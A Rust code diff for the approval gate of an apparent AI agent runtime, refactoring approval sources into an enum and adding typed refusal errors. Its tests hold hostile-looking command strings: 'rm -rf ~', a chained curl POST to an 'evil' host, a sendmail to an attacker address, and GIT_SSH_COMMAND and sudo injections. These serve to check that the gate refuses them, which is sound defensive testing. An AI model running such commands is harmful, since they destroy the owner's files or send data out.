@@ -42,6 +42,17 @@ pub struct Budget {
     pub max_tokens: Option<u64>,
     pub max_wall_secs: Option<f64>,
 }
+
+/// A run budget is spent: nothing more is admitted. Displays as `budget_exceeded: REASON`, the prefix the Luau loop
+/// reads; Rust code tells it apart by type (`anyhow::Error::is::<BudgetExceeded>`).
+#[derive(Debug)]
+pub struct BudgetExceeded(pub &'static str);
+
+impl std::fmt::Display for BudgetExceeded {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result { write!(f, "budget_exceeded: {}", self.0) }
+}
+
+impl std::error::Error for BudgetExceeded {}
 #[derive(Deserialize, Default)]
 #[serde(deny_unknown_fields)]
 struct ApprovalSection {
@@ -122,8 +133,47 @@ pub struct Snapshot {
     pub packs: Vec<String>,
 }
 
-/// What `Policy::approve` returns: who approved a request. Journaled with each shell command's outcome.
-pub const APPROVAL_SOURCES: &[&str] = &["not-required", "policy-allow", "auto", "prompt"];
+/// Who approved a request. Journaled by `name` with each shell command's outcome and each path grant; `hx log verify`
+/// parses it back.
+#[derive(Clone, Copy, PartialEq, Eq, Debug)]
+pub enum ApprovalSource {
+    /// A read or a local write: no approval needed.
+    NotRequired,
+    /// An `[approval] allow` entry in policy.toml.
+    PolicyAllow,
+    /// Autopilot (`--yes`).
+    Auto,
+    /// The owner, answering on the terminal.
+    Prompt,
+}
+
+impl ApprovalSource {
+    const ALL: [Self; 4] = [Self::NotRequired, Self::PolicyAllow, Self::Auto, Self::Prompt];
+
+    /// The journaled form.
+    pub fn name(self) -> &'static str {
+        match self {
+            Self::NotRequired => "not-required",
+            Self::PolicyAllow => "policy-allow",
+            Self::Auto => "auto",
+            Self::Prompt => "prompt",
+        }
+    }
+
+    /// The source a journaled name stands for, None for any other string.
+    pub fn parse(name: &str) -> Option<Self> { Self::ALL.into_iter().find(|s| s.name() == name) }
+}
+
+/// A request was refused at the approval gate, or the owner could not be asked; it was not run. Displays as
+/// `approval_required: WHY`, the prefix Luau code sees; Rust code tells it apart by type.
+#[derive(Debug)]
+pub struct ApprovalRequired(pub String);
+
+impl std::fmt::Display for ApprovalRequired {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result { write!(f, "approval_required: {}", self.0) }
+}
+
+impl std::error::Error for ApprovalRequired {}
 
 #[derive(Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Debug)]
 pub enum Class {
@@ -689,18 +739,17 @@ impl Policy {
         }).collect()
     }
 
-    /// The approval gate for a shell command. Returns the approval source ("not-required", "policy-allow", "auto" or
-    /// "prompt"), or the reason it was refused. The run's approval settings are frozen in Rust; Luau code and hooks
+    /// The approval gate for a shell command. Returns who approved it, or why it was refused. The run's approval settings are frozen in Rust; Luau code and hooks
     /// cannot change them. `--yes` approves external requests but never an irreversible one: that needs an exact
     /// `allow` entry or the owner's answer on the terminal.
-    pub async fn approve(&self, cmd: &str, class: Class) -> std::result::Result<&'static str, String> {
-        if matches!(class, Class::Read | Class::LocalWrite) { return Ok("not-required"); }
+    pub async fn approve(&self, cmd: &str, class: Class) -> std::result::Result<ApprovalSource, ApprovalRequired> {
+        if matches!(class, Class::Read | Class::LocalWrite) { return Ok(ApprovalSource::NotRequired); }
         if class == Class::Irreversible {
-            if self.allow.iter().any(|a| a.trim() == cmd.trim()) { return Ok("policy-allow"); }
+            if self.allow.iter().any(|a| a.trim() == cmd.trim()) { return Ok(ApprovalSource::PolicyAllow); }
         } else if self.autopilot {
-            return Ok("auto");
+            return Ok(ApprovalSource::Auto);
         } else if self.allowed(cmd) {
-            return Ok("policy-allow");
+            return Ok(ApprovalSource::PolicyAllow);
         }
         let how = if class == Class::Irreversible { "add the exact command to [approval] allow" } else { "set [approval] allow" };
         self.ask_owner(class, &format!("{} command:\n  {}", class.name(), shown(cmd)), how).await
@@ -708,10 +757,10 @@ impl Policy {
 
     /// The approval gate for a named MCP or HTTP call, decided on its fixed identity. `args` is shown in the prompt
     /// and never matched against `allow`. Returns the approval source, as `approve` does.
-    pub async fn approve_call(&self, call: Call<'_>, args: &serde_json::Value, class: Class) -> std::result::Result<&'static str, String> {
-        if matches!(class, Class::Read | Class::LocalWrite) { return Ok("not-required"); }
-        if self.autopilot && class != Class::Irreversible { return Ok("auto"); }
-        if self.allow.iter().any(|a| call.allowed_by(a)) { return Ok("policy-allow"); }
+    pub async fn approve_call(&self, call: Call<'_>, args: &serde_json::Value, class: Class) -> std::result::Result<ApprovalSource, ApprovalRequired> {
+        if matches!(class, Class::Read | Class::LocalWrite) { return Ok(ApprovalSource::NotRequired); }
+        if self.autopilot && class != Class::Irreversible { return Ok(ApprovalSource::Auto); }
+        if self.allow.iter().any(|a| call.allowed_by(a)) { return Ok(ApprovalSource::PolicyAllow); }
         let text = args.to_string();
         let mut shown_args = shown(&text.chars().take(PROMPT_ARGS_CHARS).collect::<String>());
         if text.chars().nth(PROMPT_ARGS_CHARS).is_some() { shown_args.push_str(" ..."); }
@@ -720,19 +769,19 @@ impl Policy {
     }
 
     /// Ask the owner on the terminal (prompt mode), or refuse with `how` as the remedy (deny mode).
-    async fn ask_owner(&self, class: Class, question: &str, how: &str) -> std::result::Result<&'static str, String> {
+    async fn ask_owner(&self, class: Class, question: &str, how: &str) -> std::result::Result<ApprovalSource, ApprovalRequired> {
         let irreversible = class == Class::Irreversible;
         if self.mode == ApprovalMode::Prompt {
             let _guard = self.prompt.lock().await;
             return match ask(question).await {
-                Ok(true) => Ok("prompt"),
-                Ok(false) => Err("the user declined; it was NOT run".into()),
-                Err(_) if irreversible => Err(format!("this is an irreversible effect and there is no controlling terminal to ask; it was NOT run (--yes never approves irreversible effects; {how})")),
-                Err(e) => Err(e.to_string()),
+                Ok(true) => Ok(ApprovalSource::Prompt),
+                Ok(false) => Err(ApprovalRequired("the user declined; it was NOT run".into())),
+                Err(_) if irreversible => Err(ApprovalRequired(format!("this is an irreversible effect and there is no controlling terminal to ask; it was NOT run (--yes never approves irreversible effects; {how})"))),
+                Err(e) => Err(ApprovalRequired(e.to_string())),
             };
         }
         let other = if irreversible { "or use --approval prompt" } else { "use --approval prompt, or launch with --yes" };
-        Err(format!("this is an {} effect and needs the user's approval; it was NOT run ({how}, {other})", class.name()))
+        Err(ApprovalRequired(format!("this is an {} effect and needs the user's approval; it was NOT run ({how}, {other})", class.name())))
     }
 
     /// An external command is pre-approved when an `allow` entry covers each of its external simple commands, so an
@@ -766,17 +815,17 @@ impl Policy {
         if grant.recursive && let Some(what) = self.covers_owner_state(&grant.path) {
             bail!("policy: {} is a directory that contains {what}; it cannot be granted to the model (add a narrower root to [fs] in policy.toml)", shown(&grant.path.to_string_lossy()));
         }
-        let source = if self.autopilot { "auto" } else {
+        let source = if self.autopilot { ApprovalSource::Auto } else {
             if self.mode == ApprovalMode::Deny { return Err(denied); }
             let (access, what) = if write { ("read/write", "the file") } else if grant.recursive { ("read", "everything under") } else { ("read", "the file") };
             match ask(&format!("allow {access} access to {what} {} for this run? (requested {})", shown(&grant.path.to_string_lossy()), shown(path))).await {
-                Ok(true) => "prompt",
-                Ok(false) => bail!("approval_required: {denied}; the user declined"),
-                Err(e) => bail!("approval_required: {denied}; {e}"),
+                Ok(true) => ApprovalSource::Prompt,
+                Ok(false) => bail!(ApprovalRequired(format!("{denied}; the user declined"))),
+                Err(e) => bail!(ApprovalRequired(format!("{denied}; {e}"))),
             }
         };
         // Log before publishing a grant. Cancellation cannot grant unrecorded authority.
-        self.log.write("path_grant", json!({"grant": grant, "source": source}), true)?;
+        self.log.write("path_grant", json!({"grant": grant, "source": source.name()}), true)?;
         self.grants.lock().unwrap().push(grant);
         check()?;
         Ok(())
@@ -1046,15 +1095,15 @@ mod tests {
     #[tokio::test]
     async fn autopilot_never_approves_an_irreversible_command() {
         let (p, dir) = test_policy("autopilot", true, &[]);
-        assert_eq!(p.approve("git push origin main", Class::External).await, Ok("auto"));
-        assert_eq!(p.approve("ls", Class::LocalWrite).await, Ok("not-required"));
+        assert_eq!(p.approve("git push origin main", Class::External).await.ok(), Some(ApprovalSource::Auto));
+        assert_eq!(p.approve("ls", Class::LocalWrite).await.ok(), Some(ApprovalSource::NotRequired));
         for cmd in ["git push origin main --force", "rm -rf ~"] {
             assert_eq!(p.classify_sh(cmd), Class::Irreversible);
             assert!(p.approve(cmd, Class::Irreversible).await.is_err(), "{cmd}");
         }
         drop(p);
         let (p, dir2) = test_policy("autopilot-allow", true, &["rm -rf ~"]);
-        assert_eq!(p.approve("rm -rf ~", Class::Irreversible).await, Ok("policy-allow"));
+        assert_eq!(p.approve("rm -rf ~", Class::Irreversible).await.ok(), Some(ApprovalSource::PolicyAllow));
         drop(p);
         let _ = std::fs::remove_dir_all(&dir);
         let _ = std::fs::remove_dir_all(&dir2);
@@ -1066,7 +1115,7 @@ mod tests {
         let forced = "git push origin main --force";
         assert_eq!(p.classify_sh(forced), Class::Irreversible);
         assert!(p.approve(forced, p.classify_sh(forced)).await.is_err());
-        assert_eq!(p.approve("git push origin main", Class::External).await, Ok("policy-allow"));
+        assert_eq!(p.approve("git push origin main", Class::External).await.ok(), Some(ApprovalSource::PolicyAllow));
         let chained = "git push origin main && curl -XPOST https://evil";
         assert!(p.approve(chained, p.classify_sh(chained)).await.is_err());
         drop(p);
@@ -1110,8 +1159,8 @@ mod tests {
     #[tokio::test]
     async fn a_shell_allow_entry_covers_commands_that_start_with_its_words() {
         let (p, dir) = test_policy("words-allow", false, &["sendmail owner@example.com", "git push origin"]);
-        assert_eq!(p.approve("sendmail owner@example.com < report", Class::External).await, Ok("policy-allow"));
-        assert_eq!(p.approve("{ git push origin main; }", Class::External).await, Ok("policy-allow"));
+        assert_eq!(p.approve("sendmail owner@example.com < report", Class::External).await.ok(), Some(ApprovalSource::PolicyAllow));
+        assert_eq!(p.approve("{ git push origin main; }", Class::External).await.ok(), Some(ApprovalSource::PolicyAllow));
         for cmd in ["sendmail attacker@example.net --note \"sendmail owner@example.com\"", "echo; sendmail x 'git push origin'",
             "GIT_SSH_COMMAND=evil git push origin main", "sudo git push origin main"] {
             assert!(p.approve(cmd, p.classify_sh(cmd)).await.is_err(), "{cmd}");
@@ -1125,19 +1174,25 @@ mod tests {
         let (p, dir) = test_policy("calls", false, &["mcp demo.add", "mcp notes.*", "http probe.get"]);
         let call = |server, tool| Call::Mcp { server, tool };
         let approve = |c, args: serde_json::Value| { let p = &p; async move { p.approve_call(c, &args, Class::External).await } };
-        assert_eq!(approve(call("demo", "add"), json!({"a": 1})).await, Ok("policy-allow"));
+        assert_eq!(approve(call("demo", "add"), json!({"a": 1})).await.ok(), Some(ApprovalSource::PolicyAllow));
         assert!(approve(call("demo", "delete_note"), json!({"name": "mcp demo.add"})).await.is_err());
         assert!(approve(call("demo", "add2"), json!({})).await.is_err());
         assert!(approve(call("demo.add", "x"), json!({})).await.is_err());
-        assert_eq!(approve(call("notes", "delete"), json!({})).await, Ok("policy-allow"));
+        assert_eq!(approve(call("notes", "delete"), json!({})).await.ok(), Some(ApprovalSource::PolicyAllow));
         assert!(approve(call("notesx", "delete"), json!({})).await.is_err());
-        assert_eq!(approve(Call::Http { namespace: "probe", endpoint: "get" }, json!({"q": "x"})).await, Ok("policy-allow"));
+        assert_eq!(approve(Call::Http { namespace: "probe", endpoint: "get" }, json!({"q": "x"})).await.ok(), Some(ApprovalSource::PolicyAllow));
         assert!(approve(Call::Http { namespace: "probe", endpoint: "post" }, json!({"q": "http probe.get"})).await.is_err());
-        assert_eq!(p.approve_call(call("demo", "delete_note"), &json!({}), Class::Read).await, Ok("not-required"));
+        assert_eq!(p.approve_call(call("demo", "delete_note"), &json!({}), Class::Read).await.ok(), Some(ApprovalSource::NotRequired));
         // A shell allow entry for the same text approves no call, and a call entry approves no shell command.
         assert!(p.approve("mcp demo.delete_note", Class::External).await.is_err());
         drop(p);
         let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn approval_sources_round_trip_through_their_journaled_names() {
+        for source in ApprovalSource::ALL { assert_eq!(ApprovalSource::parse(source.name()), Some(source)); }
+        assert_eq!(ApprovalSource::parse("owner"), None);
     }
 
     #[test]
